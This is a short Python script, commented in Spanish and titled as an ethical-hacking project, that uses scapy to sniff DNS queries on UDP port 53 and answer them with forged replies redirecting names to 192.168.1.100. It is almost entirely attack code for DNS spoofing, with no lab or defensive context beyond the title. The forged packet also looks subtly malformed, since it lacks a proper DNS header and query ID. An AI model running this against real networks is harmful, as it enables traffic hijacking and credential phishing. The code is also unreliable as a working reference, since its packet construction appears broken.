'''
PROYECTOS DE HACKING ETICO WITH PYTHON
DNS SPOOFING
'''

# Este proyecto implica redirigir solicitudes DNS a una dirección IP diferente utilizando Python.

# Se utiliza scapy para manipular paquetes y responder a las solicitudes DNS con información falsa.

from scapy.all import *

# Función para spoofear DNS
def dns_spoof(packet):
    if packet.haslayer(DNSQR):
        # Crear una respuesta DNS falsificada
        spoofed_packet = IP(dst=packet[IP].src, src=packet[IP].dst)/\
                         UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
                         DNSRR(rrname=packet[DNS].qd.qname, type='A', rdata='192.168.1.100', ttl=123)
        send(spoofed_packet, verbose=0)

# Sniffear paquetes DNS
sniff(filter="udp port 53", store=0, prn=dns_spoof)